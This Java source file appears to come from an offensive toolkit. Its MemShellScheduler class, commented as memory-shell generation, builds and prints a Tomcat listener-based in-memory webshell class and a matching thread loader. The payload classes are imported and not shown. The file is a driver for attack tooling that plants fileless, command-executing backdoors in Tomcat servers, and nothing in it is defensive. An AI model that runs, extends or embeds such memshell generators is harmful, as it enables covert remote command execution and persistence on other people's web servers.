package com.ppp;

import com.ppp.memshell.ListenerExec;
import com.ppp.middleware.tomcat.TomcatLoaderMaker;
import com.ppp.middleware.tomcat.TomcatMSJavaClassMaker;
import com.ppp.middleware.tomcat.TomcatThreadLoader;

/**
 * @author Whoopsunix
 * 内存马生成
 */
public class MemShellScheduler {
    public static void main(String[] args) throws Exception {
        make();
    }

    public static void make() throws Exception {
        TomcatLoaderMaker loaderMaker = new TomcatLoaderMaker();
        TomcatMSJavaClassMaker msJavaClassMaker = new TomcatMSJavaClassMaker();

        String msJavaClass = msJavaClassMaker.listener(ListenerExec.class);
        System.out.println("msJavaClass:");
        System.out.println(msJavaClass);

        String ms = loaderMaker.listener(TomcatThreadLoader.class, msJavaClass);
        System.out.println("ms:");
        System.out.println(ms);
    }

}
